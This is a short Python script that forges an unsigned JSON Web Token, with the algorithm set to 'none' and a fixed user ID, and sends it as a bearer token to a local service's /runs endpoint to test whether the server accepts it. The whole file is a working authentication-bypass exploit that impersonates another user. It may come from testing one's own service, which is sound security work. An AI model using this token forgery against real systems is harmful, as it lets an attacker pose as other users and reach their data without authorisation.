import requests
import base64

header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode()
payload = base64.urlsafe_b64encode(b'{"user_id":"Anx1z5gEqpRaFctGlGMlkYwuOzB2"}').decode()
fake_jwt = f'{header}.{payload}.'

resp = requests.get('http://127.0.0.1:8000/runs', headers={'Authorization': f'Bearer {fake_jwt}'})
print(resp.status_code)
print(resp.text[:500])
